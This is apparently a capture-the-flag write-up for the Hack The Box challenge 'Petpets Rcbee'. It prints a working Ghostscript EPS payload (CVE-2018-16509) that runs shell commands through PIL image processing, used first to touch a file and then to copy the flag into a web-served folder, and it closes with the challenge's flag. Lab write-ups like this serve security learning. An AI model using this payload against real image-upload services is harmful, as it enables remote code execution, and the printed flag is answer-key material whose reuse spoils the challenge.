# Petpets Rcbee

I really enjoyed this challenge. At first I assumed it would be php injection, which i've brefely used before. But after some googling, I was lead to: https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2018-16509. This vulnerability is in the PIL python module and lets us RCE when a file is loaded. Code isn't executed when the image is opened, but functions such as `scale`, `trim`, etc will execute the command

The payload the writeup gives is:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```

Using the Docker I ran it as a POC and got given the error: `touch: cannot touch '/app/static/petpetpets/got_rce': No such file or directory` showing it works and the website is vulnerable!

Changing the payload script to the following gives us the flag:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/got_rce) currentdevice putdeviceprops
```

This executes behind the scenes and navigating to `http://IP:PORT/static/petpets/got_rce` will give us the file with the flag in!

Flag: `HTB{c0mfy_bzzzzz_rcb33s_v1b3s}`
